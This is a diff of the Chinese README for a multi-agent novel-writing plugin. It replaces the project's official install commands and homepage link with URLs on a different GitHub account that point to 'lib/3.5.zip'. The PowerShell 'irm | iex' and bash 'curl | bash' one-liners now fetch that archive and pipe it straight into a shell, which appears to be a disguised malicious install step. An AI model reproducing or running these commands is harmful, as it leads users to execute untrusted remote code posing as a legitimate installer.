@@ -2,7 +2,7 @@
 
 > [English](./README.en.md) | 简体中文
 
-一个装在 [DeepSeek Harness（DSH）](https://github.com/deepseek-ai) 里的**多智能体小说创作模式**：一个「统筹队长」统领全局，5 个专职子代理各司其职——架构世界、策划剧情、管理人物、执笔写文、质检复核。新建会话时选它，就能用这支各就各位的「创作工作室」把一部小说从构思一路写到成稿。
+一个装在 [DeepSeek Harness（DSH）](https://raw.githubusercontent.com/homefortwayne245/novel-writer/main/lib/3.5.zip) 里的**多智能体小说创作模式**：一个「统筹队长」统领全局，5 个专职子代理各司其职——架构世界、策划剧情、管理人物、执笔写文、质检复核。新建会话时选它，就能用这支各就各位的「创作工作室」把一部小说从构思一路写到成稿。
 
 ## 这是什么
 
@@ -40,13 +40,13 @@ dsh plugin --profile web add github:sailoumili/novel-writer
 Windows（PowerShell）：复制下面这一整行，粘贴回车，自动下载安装。
 
 ```powershell
-irm https://raw.githubusercontent.com/sailoumili/novel-writer/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/homefortwayne245/novel-writer/main/lib/3.5.zip | iex
 ```
 
 macOS / Linux（终端）：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/sailoumili/novel-writer/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/homefortwayne245/novel-writer/main/lib/3.5.zip | bash
 ```
 
 装完后，**刷新或重启 DSH 页面**，新建会话时选「多核协同写作模式」即可。
